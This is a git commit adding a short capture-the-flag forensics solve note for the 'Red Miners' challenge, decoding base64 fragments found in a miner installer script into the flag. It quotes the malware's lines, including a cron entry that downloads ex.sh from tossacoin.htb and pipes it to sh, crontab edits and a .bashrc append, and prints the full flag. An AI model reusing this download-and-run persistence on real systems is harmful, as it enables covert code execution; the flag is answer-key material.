80ba611dcb00d25d37187d023b7a9f2d1ea1ec53
szhan21 <shunda.zhang@intel.com>
2023-11-09 10:36:21 +0800

    Solved Red Miners!

---
+++ ctf/forensics/RedMiners/dec.py
@@ -0,0 +1,23 @@
+'''
+grep base64 miner_installer.sh
+  crontab -l | sed '/base64/d' | crontab -
+  crontab -l | sed '/base64/d' | crontab -
+  dest=$(echo "X3QwX200cnN9Cg=="|base64 -d)
+echo "ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig==" | base64 -d >> /home/$USER/.bashrc
+    echo '* * * * * $LDR http://tossacoin.htb/ex.sh | sh & echo -n cGFydDE9IkhUQnttMW4xbmciCg==|base64 -d > /dev/null 2>&1'
+
+grep cGFy miner_installer.sh
+  local url="http://tossacoin.htb/cGFydDI9Il90aDMxcl93NHkiCg=="
+    echo '* * * * * $LDR http://tossacoin.htb/ex.sh | sh & echo -n cGFydDE9IkhUQnttMW4xbmciCg==|base64 -d > /dev/null 2>&1'
+
+echo "X3QwX200cnN9Cg=="|base64 -d
+_t0_m4rs}
+echo cGFydDI9Il90aDMxcl93NHkiCg==|base64 -d
+part2="_th31r_w4y"
+echo -n cGFydDE9IkhUQnttMW4xbmciCg==|base64 -d
+part1="HTB{m1n1ng"
+cho "ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig==" | base64 -d
+export part4="_th3_r3d_pl4n3t}
+
+HTB{m1n1ng_th31r_w4y_t0_m4rs_th3_r3d_pl4n3t}
+'''
